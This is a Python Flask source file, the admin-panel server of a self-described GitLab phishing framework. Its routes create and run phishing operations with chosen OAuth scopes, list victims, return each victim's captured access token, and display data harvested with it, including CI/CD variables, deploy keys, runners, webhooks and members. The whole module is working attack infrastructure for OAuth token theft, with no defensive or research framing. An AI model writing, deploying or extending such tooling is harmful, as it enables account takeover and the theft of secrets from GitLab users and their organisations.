"""
Admin Panel Web Server module for the GitLab Phishing Framework.
Provides web interface for managing operations and monitoring victims.
"""

import logging
import threading
from typing import Callable, Optional
from flask import Flask, render_template, jsonify, request, send_from_directory
from pathlib import Path

from ..interfaces import WebServerInterface, OperationResult
from ..models import Config


logger = logging.getLogger(__name__)


class WebServer(WebServerInterface):
    """Admin Panel Web Server using Flask."""
    
    def __init__(self, config: Config):
        """
        Initialize the web server.
        
        Args:
            config: Framework configuration
        """
        self.config = config
        self.app = Flask(
            __name__,
            template_folder=str(Path(__file__).parent.parent / 'web' / 'templates'),
            static_folder=str(Path(__file__).parent.parent / 'web' / 'static')
        )
        self.server_thread: Optional[threading.Thread] = None
        self.is_running = False
        self.engine_callback: Optional[Callable] = None
        
        # Setup error handlers
        self._setup_error_handlers()
        
        # Setup routes
        self._setup_routes()
        
        logger.info("WebServer initialized")
    
    def _setup_error_handlers(self):
        """Setup Flask error handlers to always return JSON for API endpoints."""
        
        @self.app.errorhandler(404)
        def handle_404(e):
            """Handle 404 errors silently for non-API requests."""
            if request.path.startswith('/api/'):
                return jsonify({'success': False, 'error': 'Not found'}), 404
            # Silently ignore favicon and other non-API 404s
            return '', 404
        
        @self.app.errorhandler(Exception)
        def handle_exception(e):
            """Handle all exceptions and return JSON for API endpoints."""
            # Skip 404 errors (handled above)
            if isinstance(e, Exception) and '404' in str(e):
                return handle_404(e)
            
            # Check if this is an API request
            if request.path.startswith('/api/'):
                logger.error(f"Unhandled exception in {request.path}: {e}", exc_info=True)
                return jsonify({
                    'success': False,
                    'error': str(e),
                    'type': type(e).__name__
                }), 500
            
            # For non-API requests, return empty response
            return '', 500
    
    def _setup_routes(self):
        """Setup Flask routes for the admin panel."""
        
        # Main dashboard
        @self.app.route('/admin')
        def admin_dashboard():
            """Serve the main admin dashboard."""
            return render_template('admin_panel.html')
        
        # Enumeration results page
        @self.app.route('/enumeration/<int:victim_id>')
        def enumeration_results(victim_id):
            """Serve enumeration results page for a victim."""
            try:
                # Use database directly
                from src.db import Database
                db = Database()
                
                # Get victim data
                victim = db.get_victim(victim_id)
                if not victim:
                    return "Victim not found", 404
                
                # Get token
                token = db.get_token(victim_id)
                
                # Get all enumeration data
                projects = db.get_projects(victim_id)
                groups = db.get_groups(victim_id)
                snippets = db.get_snippets(victim_id)
                ssh_keys = []
                
                # Get project-specific data
                all_ci_variables = []
                all_project_members = []
                all_merge_requests = []
                all_issues = []
                all_deploy_keys = []
                all_webhooks = []
                all_protected_branches = []
                all_runners = []
                all_container_registries = []
                all_packages = []
                
                for project in projects:
                    project_db_id = project['id']
                    
                    # CI/CD variables
                    ci_vars = db.get_ci_variables(project_db_id)
                    for var in ci_vars:
                        var['project_name'] = project['name']
                        all_ci_variables.append(var)
                    
                    # Project members
                    members = db.get_project_members(project_db_id)
                    for member in members:
                        member['project_name'] = project['name']
                        all_project_members.append(member)
                    
                    # Merge requests
                    mrs = db.get_merge_requests(project_db_id)
                    for mr in mrs:
                        mr['project_name'] = project['name']
                        all_merge_requests.append(mr)
                    
                    # Issues
                    issues = db.get_issues(project_db_id)
                    for issue in issues:
                        issue['project_name'] = project['name']
                        all_issues.append(issue)
                    
                    # Deploy keys
                    keys = db.get_deploy_keys(project_db_id)
                    for key in keys:
                        key['project_name'] = project['name']
                        all_deploy_keys.append(key)
                    
                    # Webhooks
                    hooks = db.get_webhooks(project_db_id)
                    for hook in hooks:
                        hook['project_name'] = project['name']
                        all_webhooks.append(hook)
                    
                    # Protected branches
                    branches = db.get_protected_branches(project_db_id)
                    for branch in branches:
                        branch['project_name'] = project['name']
                        all_protected_branches.append(branch)
                    
                    # Runners
                    runners = db.get_runners(project_db_id)
                    for runner in runners:
                        runner['project_name'] = project['name']
                        all_runners.append(runner)
                    
                    # Container registries
                    registries = db.get_container_registries(project_db_id)
                    for registry in registries:
                        registry['project_name'] = project['name']
                        all_container_registries.append(registry)
                    
                    # Packages
                    packages = db.get_packages(project_db_id)
                    for package in packages:
                        package['project_name'] = project['name']
                        all_packages.append(package)
                
                # Get group-specific data
                all_group_members = []
                for group in groups:
                    group_db_id = group['id']
                    members = db.get_group_members(group_db_id)
                    for member in members:
                        member['group_name'] = group['name']
                        all_group_members.append(member)
                
                # Prepare JSON data
                import json
                json_data = json.dumps({
                    'victim': victim,
                    'token': token,
                    'projects': projects,
                    'groups': groups,
                    'ci_variables': all_ci_variables,
                    'project_members': all_project_members,
                    'group_members': all_group_members,
                    'merge_requests': all_merge_requests,
                    'issues': all_issues,
                    'snippets': snippets,
                    'deploy_keys': all_deploy_keys,
                    'webhooks': all_webhooks,
                    'protected_branches': all_protected_branches,
                    'runners': all_runners,
                    'container_registries': all_container_registries,
                    'packages': all_packages,
                    'ssh_keys': ssh_keys
                }, indent=2, default=str)
                
                return render_template('enumeration_results.html',
                                     victim=victim,
                                     token=token,
                                     projects=projects,
                                     groups=groups,
                                     ci_variables=all_ci_variables,
                                     project_members=all_project_members,
                                     group_members=all_group_members,
                                     merge_requests=all_merge_requests,
                                     issues=all_issues,
                                     snippets=snippets,
                                     deploy_keys=all_deploy_keys,
                                     webhooks=all_webhooks,
                                     protected_branches=all_protected_branches,
                                     runners=all_runners,
                                     container_registries=all_container_registries,
                                     packages=all_packages,
                                     ssh_keys=ssh_keys,
                                     json_data=json_data)
            except Exception as e:
                logger.error(f"Error loading enumeration results for victim {victim_id}: {e}")
                return f"Error loading results: {str(e)}", 500
        
        # Global statistics
        @self.app.route('/api/stats')
        def get_stats():
            """Get global statistics."""
            try:
                if not self.engine_callback:
                    return jsonify({'error': 'Engine not available'}), 500
                
                stats = self.engine_callback('get_stats')
                return jsonify(stats)
            except Exception as e:
                logger.error(f"Error getting stats: {e}")
                return jsonify({'error': str(e)}), 500
        
        # Operations endpoints
        @self.app.route('/api/operations')
        def get_operations():
            """Get all operations."""
            try:
                if not self.engine_callback:
                    return jsonify({'error': 'Engine not available'}), 500
                
                operations = self.engine_callback('get_all_operations')
                return jsonify(operations)
            except Exception as e:
                logger.error(f"Error getting operations: {e}")
                return jsonify({'error': str(e)}), 500
        
        @self.app.route('/api/operations/<int:operation_id>')
        def get_operation(operation_id):
            """Get operation details."""
            try:
                if not self.engine_callback:
                    return jsonify({'error': 'Engine not available'}), 500
                
                operation = self.engine_callback('get_operation', operation_id)
                if not operation:
                    return jsonify({'error': 'Operation not found'}), 404
                
                return jsonify(operation)
            except Exception as e:
                logger.error(f"Error getting operation {operation_id}: {e}")
                return jsonify({'error': str(e)}), 500
        
        @self.app.route('/api/operations/create', methods=['POST'])
        def create_operation():
            """Create a new operation."""
            try:
                if not self.engine_callback:
                    return jsonify({'error': 'Engine not available'}), 500
                
                data = request.get_json()
                
                # Validate required fields
                required_fields = ['name', 'instance_type', 'base_url', 'client_id', 'scopes']
                for field in required_fields:
                    if field not in data:
                        return jsonify({'error': f'Missing required field: {field}'}), 400
                
                # Note: All scopes are technically valid for both SaaS and self-managed
                # However, some scopes like 'sudo', 'admin_mode', 'read_service_ping' 
                # require administrator privileges and will only work if:
                # 1. The user is an administrator
                # 2. The OAuth application has these scopes enabled
                # 
                # If the token doesn't have the required permissions, GitLab API will return 403
                # which is handled gracefully by the enumeration module with graceful degradation
                
                # Create operation
                result = self.engine_callback('create_operation', data)
                
                if result.get('success'):
                    return jsonify(result), 201
                else:
                    return jsonify(result), 400
            except Exception as e:
                logger.error(f"Error creating operation: {e}")
                return jsonify({'error': str(e)}), 500
        
        @self.app.route('/api/operations/<int:operation_id>/start', methods=['POST'])
        def start_operation(operation_id):
            """Start an operation."""
            try:
                if not self.engine_callback:
                    return jsonify({'error': 'Engine not available'}), 500
                
                result = self.engine_callback('start_operation', operation_id)
                
                if result.get('success'):
                    return jsonify(result)
                else:
                    return jsonify(result), 400
            except Exception as e:
                logger.error(f"Error starting operation {operation_id}: {e}")
                return jsonify({'error': str(e)}), 500
        
        @self.app.route('/api/operations/<int:operation_id>/stop', methods=['POST'])
        def stop_operation(operation_id):
            """Stop an operation."""
            try:
                if not self.engine_callback:
                    return jsonify({'error': 'Engine not available'}), 500
                
                result = self.engine_callback('stop_operation', operation_id)
                
                if result.get('success'):
                    return jsonify(result)
                else:
                    return jsonify(result), 400
            except Exception as e:
                logger.error(f"Error stopping operation {operation_id}: {e}")
                return jsonify({'error': str(e)}), 500
        
        @self.app.route('/api/operations/<int:operation_id>/delete', methods=['DELETE'])
        def delete_operation(operation_id):
            """Delete an operation."""
            try:
                if not self.engine_callback:
                    return jsonify({'error': 'Engine not available'}), 500
                
                result = self.engine_callback('delete_operation', operation_id)
                
                if result.get('success'):
                    return jsonify(result)
                else:
                    return jsonify(result), 400
            except Exception as e:
                logger.error(f"Error deleting operation {operation_id}: {e}")
                return jsonify({'error': str(e)}), 500
        
        # Victims endpoints
        @self.app.route('/api/victims')
        def get_victims():
            """Get all victims."""
            try:
                if not self.engine_callback:
                    return jsonify({'error': 'Engine not available'}), 500
                
                operation_id = request.args.get('operation_id', type=int)
                victims = self.engine_callback('get_victims', operation_id)
                return jsonify(victims)
            except Exception as e:
                logger.error(f"Error getting victims: {e}")
                return jsonify({'error': str(e)}), 500
        
        @self.app.route('/api/victims/<int:victim_id>')
        def get_victim(victim_id):
            """Get victim details."""
            try:
                if not self.engine_callback:
                    return jsonify({'error': 'Engine not available'}), 500
                
                victim = self.engine_callback('get_victim', victim_id)
                if not victim:
                    return jsonify({'error': 'Victim not found'}), 404
                
                return jsonify(victim)
            except Exception as e:
                logger.error(f"Error getting victim {victim_id}: {e}")
                return jsonify({'error': str(e)}), 500
        
        @self.app.route('/api/victims/<int:victim_id>/token')
        def get_victim_token(victim_id):
            """Get victim's access token."""
            try:
                if not self.engine_callback:
                    return jsonify({'error': 'Engine not available'}), 500
                
                token = self.engine_callback('get_victim_token', victim_id)
                if not token:
                    return jsonify({'error': 'Token not found'}), 404
                
                return jsonify(token)
            except Exception as e:
                logger.error(f"Error getting token for victim {victim_id}: {e}")
                return jsonify({'error': str(e)}), 500
        
        @self.app.route('/api/victims/<int:victim_id>/enumerate', methods=['POST'])
        def enumerate_victim(victim_id):
            """Start enumeration for a victim."""
            try:
                if not self.engine_callback:
                    return jsonify({'error': 'Engine not available'}), 500
                
                options = request.get_json() or {}
                result = self.engine_callback('enumerate_victim', victim_id, options)
                
                if result.get('success'):
                    return jsonify(result)
                else:
                    return jsonify(result), 400
            except Exception as e:
                logger.error(f"Error enumerating victim {victim_id}: {e}")
                return jsonify({'error': str(e)}), 500
        
        @self.app.route('/api/victims/<int:victim_id>/delete', methods=['DELETE'])
        def delete_victim(victim_id):
            """Delete a victim and all associated data."""
            try:
                if not self.engine_callback:
                    return jsonify({'error': 'Engine not available'}), 500
                
                result = self.engine_callback('delete_victim', victim_id)
                
                if result.get('success'):
                    return jsonify(result)
                else:
                    return jsonify(result), 400
            except Exception as e:
                logger.error(f"Error deleting victim {victim_id}: {e}")
                return jsonify({'error': str(e)}), 500
        
        @self.app.route('/api/projects/<int:project_id>/enumerate_deeper')
        def enumerate_project_deeper(project_id):
            """Enumerate deeper details of a specific project."""
            try:
                victim_id = request.args.get('victim_id', type=int)
                if not victim_id:
                    return jsonify({'error': 'victim_id required'}), 400
                
                if not self.engine_callback:
                    return jsonify({'error': 'Engine not available'}), 500
                
                result = self.engine_callback('enumerate_project_deeper', project_id, victim_id)
                
                if result.get('success'):
                    return jsonify(result.get('data', {}))
                else:
                    return jsonify({'error': result.get('error', 'Unknown error')}), 400
            except Exception as e:
                logger.error(f"Error enumerating project {project_id} deeper: {e}")
                return jsonify({'error': str(e)}), 500
        
        @self.app.route('/api/groups/<int:group_db_id>/members')
        def get_group_members(group_db_id):
            """Get members of a specific group."""
            try:
                victim_id = request.args.get('victim_id', type=int)
                if not victim_id:
                    return jsonify({'error': 'victim_id required'}), 400
                
                # Use database directly
                from src.db import Database
                db = Database()
                
                # Get group members
                members = db.get_group_members(group_db_id)
                
                return jsonify({
                    'success': True,
                    'members': members,
                    'count': len(members)
                })
            except Exception as e:
                logger.error(f"Error getting members for group {group_db_id}: {e}")
                return jsonify({'error': str(e)}), 500
        
        # Activity log endpoint
        @self.app.route('/api/activity/<int:operation_id>')
        def get_activity(operation_id):
            """Get activity log for an operation."""
            try:
                if not self.engine_callback:
                    return jsonify({'error': 'Engine not available'}), 500
                
                limit = request.args.get('limit', type=int)
                activity = self.engine_callback('get_activity_log', operation_id, limit)
                return jsonify(activity)
            except Exception as e:
                logger.error(f"Error getting activity for operation {operation_id}: {e}")
                return jsonify({'error': str(e)}), 500
        
        # Templates endpoint
        @self.app.route('/api/templates')
        def get_templates():
            """Get available attack templates."""
            try:
                if not self.engine_callback:
                    return jsonify({'error': 'Engine not available'}), 500
                
                templates = self.engine_callback('get_templates')
                return jsonify(templates)
            except Exception as e:
                logger.error(f"Error getting templates: {e}")
                return jsonify({'error': str(e)}), 500
        
        # Scopes endpoint
        @self.app.route('/api/scopes')
        def get_scopes():
            """Get all available OAuth scopes with descriptions."""
            try:
                if not self.engine_callback:
                    return jsonify({'error': 'Engine not available'}), 500
                
                scopes = self.engine_callback('get_scopes')
                return jsonify(scopes)
            except Exception as e:
                logger.error(f"Error getting scopes: {e}")
                return jsonify({'error': str(e)}), 500
        
        # Database reset endpoint
        @self.app.route('/api/database/reset', methods=['POST'])
        def reset_database():
            """Reset the entire database (delete all data)."""
            try:
                if not self.engine_callback:
                    return jsonify({'error': 'Engine not available'}), 500
                
                result = self.engine_callback('reset_database')
                
                if result.get('success'):
                    return jsonify(result)
                else:
                    return jsonify(result), 400
            except Exception as e:
                logger.error(f"Error resetting database: {e}")
                return jsonify({'error': str(e)}), 500
        
        # Static files
        @self.app.route('/static/<path:filename>')
        def serve_static(filename):
            """Serve static files."""
            return send_from_directory(self.app.static_folder, filename)
    
    def start_server(self, port: int = 3000) -> OperationResult:
        """
        Start the admin panel web server.
        
        Args:
            port: Port to listen on (default: 3000)
            
        Returns:
            OperationResult indicating server started
        """
        if self.is_running:
            logger.warning("Web server is already running")
            return OperationResult(
                success=False,
                error="Server already running"
            )
        
        try:
            # Use configured port if not specified
            if port == 3000:
                port = self.config.admin_port
            
            # Start Flask in a separate thread
            def run_server():
                self.app.run(
                    host=self.config.host,
                    port=port,
                    debug=False,
                    use_reloader=False,
                    threaded=True
                )
            
            self.server_thread = threading.Thread(target=run_server, daemon=True)
            self.server_thread.start()
            self.is_running = True
            
            logger.info(f"Admin panel started on http://{self.config.host}:{port}/admin")
            
            return OperationResult(
                success=True,
                message=f"Admin panel started on port {port}",
                data={'port': port, 'url': f"http://{self.config.host}:{port}/admin"}
            )
        except Exception as e:
            logger.error(f"Failed to start web server: {e}")
            return OperationResult(
                success=False,
                error=f"Failed to start server: {str(e)}"
            )
    
    def stop_server(self) -> OperationResult:
        """
        Stop the admin panel web server.
        
        Returns:
            OperationResult indicating server stopped
        """
        if not self.is_running:
            logger.warning("Web server is not running")
            return OperationResult(
                success=False,
                error="Server not running"
            )
        
        try:
            # Flask doesn't have a clean shutdown method when running in a thread
            # We mark it as not running and the thread will be daemon
            self.is_running = False
            
            logger.info("Admin panel stopped")
            
            return OperationResult(
                success=True,
                message="Admin panel stopped"
            )
        except Exception as e:
            logger.error(f"Error stopping web server: {e}")
            return OperationResult(
                success=False,
                error=f"Failed to stop server: {str(e)}"
            )
    
    def set_engine_callback(self, callback: Callable) -> None:
        """
        Set callback to access core engine functionality.
        
        Args:
            callback: Function to access engine methods
        """
        self.engine_callback = callback
        logger.debug("Engine callback set for web server")
